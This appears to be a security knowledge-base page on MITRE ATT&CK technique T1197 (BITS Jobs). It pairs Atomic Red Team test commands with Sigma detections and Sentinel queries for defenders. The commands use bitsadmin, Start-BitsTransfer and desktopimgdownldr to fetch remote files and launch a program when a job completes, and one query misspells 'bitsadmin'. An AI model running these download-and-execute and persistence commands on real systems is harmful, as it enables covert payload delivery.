
# BITS Jobs

## Description

### MITRE Description

> Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Firewall', 'Host forensic analysis']
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1197

## Potential Commands

```
bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}

bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} %temp%\bitsadmin1_flag.ps1

Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}

Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination $env:TEMP\bitsadmin2_flag.ps1

bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} C:\Windows\system32\notepad.exe ""
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}

bitsadmin.exe /create AtomicBITS
bitsadmin.exe /addfile AtomicBITS #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} ""
bitsadmin.exe /resume AtomicBITS
timeout 5
bitsadmin.exe /complete AtomicBITS

bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\bitsadmin3_flag.ps1
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}

bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
bitsadmin.exe /resume #{bits_job_name}
timeout 5
bitsadmin.exe /complete #{bits_job_name}

set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr

set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr

set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr

bitsadmin.exe
```

## Commands Dataset

```
[{'command': 'bitsadmin.exe /transfer /Download /priority Foreground '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
             '#{local_file}\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'bitsadmin.exe /transfer /Download /priority Foreground '
             '#{remote_file} %temp%\\bitsadmin1_flag.ps1\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'Start-BitsTransfer -Priority foreground -Source '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
             '-Destination #{local_file}\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'Start-BitsTransfer -Priority foreground -Source #{remote_file} '
             '-Destination $env:TEMP\\bitsadmin2_flag.ps1\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'bitsadmin.exe /create #{bits_job_name}\n'
             'bitsadmin.exe /addfile #{bits_job_name} #{remote_file} '
             '#{local_file}\n'
             'bitsadmin.exe /setnotifycmdline #{bits_job_name} '
             'C:\\Windows\\system32\\notepad.exe ""\n'
             'bitsadmin.exe /resume #{bits_job_name}\n'
             'timeout 5\n'
             'bitsadmin.exe /complete #{bits_job_name}\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'bitsadmin.exe /create AtomicBITS\n'
             'bitsadmin.exe /addfile AtomicBITS #{remote_file} #{local_file}\n'
             'bitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} ""\n'
             'bitsadmin.exe /resume AtomicBITS\n'
             'timeout 5\n'
             'bitsadmin.exe /complete AtomicBITS\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'bitsadmin.exe /create #{bits_job_name}\n'
             'bitsadmin.exe /addfile #{bits_job_name} #{remote_file} '
             '%temp%\\bitsadmin3_flag.ps1\n'
             'bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} '
             '""\n'
             'bitsadmin.exe /resume #{bits_job_name}\n'
             'timeout 5\n'
             'bitsadmin.exe /complete #{bits_job_name}\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'bitsadmin.exe /create #{bits_job_name}\n'
             'bitsadmin.exe /addfile #{bits_job_name} '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
             '#{local_file}\n'
             'bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} '
             '""\n'
             'bitsadmin.exe /resume #{bits_job_name}\n'
             'timeout 5\n'
             'bitsadmin.exe /complete #{bits_job_name}\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'set "#{download_path}" && cmd /c desktopimgdownldr.exe '
             '/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
             '/eventName:desktopimgdownldr\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'set "SYSTEMROOT=C:\\Windows\\Temp" && cmd /c '
             'desktopimgdownldr.exe /lockscreenurl:#{remote_file} '
             '/eventName:desktopimgdownldr\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'set "#{download_path}" && cmd /c desktopimgdownldr.exe '
             '/lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'set "#{download_path}" && cmd /c desktopimgdownldr.exe '
             '/lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n',
  'name': None,
  'source': 'atomics/T1197/T1197.yaml'},
 {'command': 'bitsadmin.exe',
  'name': None,
  'source': 'SysmonHunter - BITS Jobs'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Michael Haag',
                  'description': 'Detects usage of bitsadmin downloading a '
                                 'file',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['/transfer'],
                                              'Image': ['*\\bitsadmin.exe']}},
                  'falsepositives': ['Some legitimate apps use this, but '
                                     'limited.'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'd059842b-6b9d-4ed1-b5c3-5b89143c6ede',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin',
                                 'https://isc.sans.edu/diary/22264'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.persistence',
                           'attack.t1197',
                           'attack.s0190'],
                  'title': 'Bitsadmin Download'}},
 {'data_source': ['BITS Logs', 'Windows event logs']},
 {'data_source': ['4688 Process CMD Line']},
 {'data_source': ['API monitoring']},
 {'data_source': ['Packet capture']},
 {'data_source': ['BITS Logs', 'Windows event logs']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['API monitoring']},
 {'data_source': ['Packet capture']}]
```

## Potential Queries

```json
[{'name': 'BITS Jobs Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3and process_path contains '
           '"bitsadmin.exe"'},
 {'name': 'BITS Jobs Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_path contains '
           '"bitsamin.exe"or process_command_line contains '
           '"Start-BitsTransfer")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - BITS Jobs': {'atomic_tests': [{'auto_generated_guid': '3c73d728-75fb-4180-a12f-6712864d7421',
                                                         'description': 'This '
                                                                        'test '
                                                                        'simulates '
                                                                        'an '
                                                                        'adversary '
                                                                        'leveraging '
                                                                        'bitsadmin.exe '
                                                                        'to '
                                                                        'download\n'
                                                                        'and '
                                                                        'execute '
                                                                        'a '
                                                                        'payload\n',
                                                         'executor': {'cleanup_command': 'del '
                                                                                         '#{local_file} '
                                                                                         '>nul '
                                                                                         '2>&1\n',
                                                                      'command': 'bitsadmin.exe '
                                                                                 '/transfer '
                                                                                 '/Download '
                                                                                 '/priority '
                                                                                 'Foreground '
                                                                                 '#{remote_file} '
                                                                                 '#{local_file}\n',
                                                                      'name': 'command_prompt'},
                                                         'input_arguments': {'local_file': {'default': '%temp%\\bitsadmin1_flag.ps1',
                                                                                            'description': 'Local '
                                                                                                           'file '
                                                                                                           'path '
                                                                                                           'to '
                                                                                                           'save '
                                                                                                           'downloaded '
                                                                                                           'file',
                                                                                            'type': 'path'},
                                                                             'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md',
                                                                                             'description': 'Remote '
                                                                                                            'file '
                                                                                                            'to '
                                                                                                            'download',
                                                                                             'type': 'url'}},
                                                         'name': 'Bitsadmin '
                                                                 'Download '
                                                                 '(cmd)',
                                                         'supported_platforms': ['windows']},
                                                        {'auto_generated_guid': 'f63b8bc4-07e5-4112-acba-56f646f3f0bc',
                                                         'description': 'This '
                                                                        'test '
                                                                        'simulates '
                                                                        'an '
                                                                        'adversary '
                                                                        'leveraging '
                                                                        'bitsadmin.exe '
                                                                        'to '
                                                                        'download\n'
                                                                        'and '
                                                                        'execute '
                                                                        'a '
                                                                        'payload '
                                                                        'leveraging '
                                                                        'PowerShell\n'
                                                                        '\n'
                                                                        'Upon '
                                                                        'execution '
                                                                        'you '
                                                                        'will '
                                                                        'find '
                                                                        'a '
                                                                        'github '
                                                                        'markdown '
                                                                        'file '
                                                                        'downloaded '
                                                                        'to '
                                                                        'the '
                                                                        'Temp '
                                                                        'directory\n',
                                                         'executor': {'cleanup_command': 'Remove-Item '
                                                                                         '#{local_file} '
                                                                                         '-ErrorAction '
                                                                                         'Ignore\n',
                                                                      'command': 'Start-BitsTransfer '
                                                                                 '-Priority '
                                                                                 'foreground '
                                                                                 '-Source '
                                                                                 '#{remote_file} '
                                                                                 '-Destination '
                                                                                 '#{local_file}\n',
                                                                      'name': 'powershell'},
                                                         'input_arguments': {'local_file': {'default': '$env:TEMP\\bitsadmin2_flag.ps1',
                                                                                            'description': 'Local '
                                                                                                           'file '
                                                                                                           'path '
                                                                                                           'to '
                                                                                                           'save '
                                                                                                           'downloaded '
                                                                                                           'file',
                                                                                            'type': 'path'},
                                                                             'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md',
                                                                                             'description': 'Remote '
                                                                                                            'file '
                                                                                                            'to '
                                                                                                            'download',
                                                                                             'type': 'url'}},
                                                         'name': 'Bitsadmin '
                                                                 'Download '
                                                                 '(PowerShell)',
                                                         'supported_platforms': ['windows']},
                                                        {'auto_generated_guid': '62a06ec5-5754-47d2-bcfc-123d8314c6ae',
                                                         'description': 'This '
                                                                        'test '
                                                                        'simulates '
                                                                        'an '
                                                                        'adversary '
                                                                        'leveraging '
                                                                        'bitsadmin.exe '
                                                                        'to '
                                                                        'schedule '
                                                                        'a '
                                                                        'BITS '
                                                                        'transferand '
                                                                        'execute '
                                                                        'a '
                                                                        'payload '
                                                                        'in '
                                                                        'multiple '
                                                                        'steps.\n'
                                                                        'Note '
                                                                        'that '
                                                                        'in '
                                                                        'this '
                                                                        'test, '
                                                                        'the '
                                                                        'file '
                                                                        'executed '
                                                                        'is '
                                                                        'not '
                                                                        'the '
                                                                        'one '
                                                                        'downloaded. '
                                                                        'The '
                                                                        'downloading '
                                                                        'of a '
                                                                        'random '
                                                                        'file '
                                                                        'is '
                                                                        'simply '
                                                                        'the '
                                                                        'trigger '
                                                                        'for '
                                                                        'getting '
                                                                        'bitsdamin '
                                                                        'to '
                                                                        'run '
                                                                        'an '
                                                                        'executable.\n'
                                                                        'This '
                                                                        'has '
                                                                        'the '
                                                                        'interesting '
                                                                        'side '
                                                                        'effect '
                                                                        'of '
                                                                        'causing '
                                                                        'the '
                                                                        'executable '
                                                                        '(e.g. '
                                                                        'notepad) '
                                                                        'to '
                                                                        'run '
                                                                        'with '
                                                                        'an '
                                                                        'Initiating '
                                                                        'Process '
                                                                        'of '
                                                                        '"svchost.exe" '
                                                                        'and '
                                                                        'an '
                                                                        'Initiating '
                                                                        'Process '
                                                                        'Command '
                                                                        'Line '
                                                                        'of '
                                                                        '"svchost.exe '
                                                                        '-k '
                                                                        'netsvcs '
                                                                        '-p -s '
                                                                        'BITS"\n'
                                                                        'This '
                                                                        'job '
                                                                        'will '
                                                                        'remain '
                                                                        'in '
                                                                        'the '
                                                                        'BITS '
                                                                        'queue '
                                                                        'until '
                                                                        'complete '
                                                                        'or '
                                                                        'for '
                                                                        'up to '
                                                                        '90 '
                                                                        'days '
                                                                        'by '
                                                                        'default '
                                                                        'if '
                                                                        'not '
                                                                        'removed.\n',
                                                         'executor': {'cleanup_command': 'del '
                                                                                         '#{local_file} '
                                                                                         '>nul '
                                                                                         '2>&1\n',
                                                                      'command': 'bitsadmin.exe '
                                                                                 '/create '
                                                                                 '#{bits_job_name}\n'
                                                                                 'bitsadmin.exe '
                                                                                 '/addfile '
                                                                                 '#{bits_job_name} '
                                                                                 '#{remote_file} '
                                                                                 '#{local_file}\n'
                                                                                 'bitsadmin.exe '
                                                                                 '/setnotifycmdline '
                                                                                 '#{bits_job_name} '
                                                                                 '#{command_path} '
                                                                                 '""\n'
                                                                                 'bitsadmin.exe '
                                                                                 '/resume '
                                                                                 '#{bits_job_name}\n'
                                                                                 'timeout '
                                                                                 '5\n'
                                                                                 'bitsadmin.exe '
                                                                                 '/complete '
                                                                                 '#{bits_job_name}\n',
                                                                      'name': 'command_prompt'},
                                                         'input_arguments': {'bits_job_name': {'default': 'AtomicBITS',
                                                                                               'description': 'Name '
                                                                                                              'of '
                                                                                                              'BITS '
                                                                                                              'job',
                                                                                               'type': 'string'},
                                                                             'command_path': {'default': 'C:\\Windows\\system32\\notepad.exe',
                                                                                              'description': 'Path '
                                                                                                             'of '
                                                                                                             'command '
                                                                                                             'to '
                                                                                                             'execute',
                                                                                              'type': 'path'},
                                                                             'local_file': {'default': '%temp%\\bitsadmin3_flag.ps1',
                                                                                            'description': 'Local '
                                                                                                           'file '
                                                                                                           'path '
                                                                                                           'to '
                                                                                                           'save '
                                                                                                           'downloaded '
                                                                                                           'file',
                                                                                            'type': 'path'},
                                                                             'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md',
                                                                                             'description': 'Remote '
                                                                                                            'file '
                                                                                                            'to '
                                                                                                            'download',
                                                                                             'type': 'url'}},
                                                         'name': 'Persist, '
                                                                 'Download, & '
                                                                 'Execute',
                                                         'supported_platforms': ['windows']},
                                                        {'auto_generated_guid': 'afb5e09e-e385-4dee-9a94-6ee60979d114',
                                                         'description': 'This '
                                                                        'test '
                                                                        'simulates '
                                                                        'using '
                                                                        'destopimgdwnldr.exe '
                                                                        'to '
                                                                        'download '
                                                                        'a '
                                                                        'malicious '
                                                                        'file\n'
                                                                        'instead '
                                                                        'of a '
                                                                        'desktop '
                                                                        'or '
                                                                        'lockscreen '
                                                                        'background '
                                                                        'img. '
                                                                        'The '
                                                                        'process '
                                                                        'that '
                                                                        'actually '
                                                                        'makes \n'
                                                                        'the '
                                                                        'TCP '
                                                                        'connection '
                                                                        'and '
                                                                        'creates '
                                                                        'the '
                                                                        'file '
                                                                        'on '
                                                                        'the '
                                                                        'disk '
                                                                        'is a '
                                                                        'svchost '
                                                                        'process '
                                                                        '(“-k '
                                                                        'netsvc '
                                                                        '-p -s '
                                                                        'BITS”) \n'
                                                                        'and '
                                                                        'not '
                                                                        'desktopimgdownldr.exe. '
                                                                        'See '
                                                                        'https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n',
                                                         'executor': {'cleanup_command': 'del '
                                                                                         '#{cleanup_path}\\#{cleanup_file}\n',
                                                                      'command': 'set '
                                                                                 '"#{download_path}" '
                                                                                 '&& '
                                                                                 'cmd '
                                                                                 '/c '
                                                                                 'desktopimgdownldr.exe '
                                                                                 '/lockscreenurl:#{remote_file} '
                                                                                 '/eventName:desktopimgdownldr\n',
                                                                      'name': 'command_prompt'},
                                                         'input_arguments': {'cleanup_file': {'default': '*.md',
                                                                                              'description': 'file '
                                                                                                             'to '
                                                                                                             'remove '
                                                                                                             'as '
                                                                                                             'part '
                                                                                                             'of '
                                                                                                             'cleanup_command',
                                                                                              'type': 'string'},
                                                                             'cleanup_path': {'default': 'C:\\Windows\\Temp\\Personalization\\LockScreenImage',
                                                                                              'description': 'path '
                                                                                                             'to '
                                                                                                             'delete '
                                                                                                             'file '
                                                                                                             'as '
                                                                                                             'part '
                                                                                                             'of '
                                                                                                             'cleanup_command',
                                                                                              'type': 'path'},
                                                                             'download_path': {'default': 'SYSTEMROOT=C:\\Windows\\Temp',
                                                                                               'description': 'Local '
                                                                                                              'file '
                                                                                                              'path '
                                                                                                              'to '
                                                                                                              'save '
                                                                                                              'downloaded '
                                                                                                              'file',
                                                                                               'type': 'path'},
                                                                             'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md',
                                                                                             'description': 'Remote '
                                                                                                            'file '
                                                                                                            'to '
                                                                                                            'download',
                                                                                             'type': 'url'}},
                                                         'name': 'Bits '
                                                                 'download '
                                                                 'using '
                                                                 'destktopimgdownldr.exe '
                                                                 '(cmd)',
                                                         'supported_platforms': ['windows']}],
                                       'attack_technique': 'T1197',
                                       'display_name': 'BITS Jobs'}},
 {'SysmonHunter - T1197': {'description': None,
                           'level': 'medium',
                           'name': 'BITS Jobs',
                           'phase': 'Execution',
                           'query': [{'process': {'any': {'pattern': 'bitsadmin.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Persistence](../tactics/Persistence.md)
    

# Mitigations


* [BITS Jobs Mitigation](../mitigations/BITS-Jobs-Mitigation.md)

* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    
* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    
* [User Account Management](../mitigations/User-Account-Management.md)
    

# Actors


* [Leviathan](../actors/Leviathan.md)

* [APT41](../actors/APT41.md)
    
* [Patchwork](../actors/Patchwork.md)
    
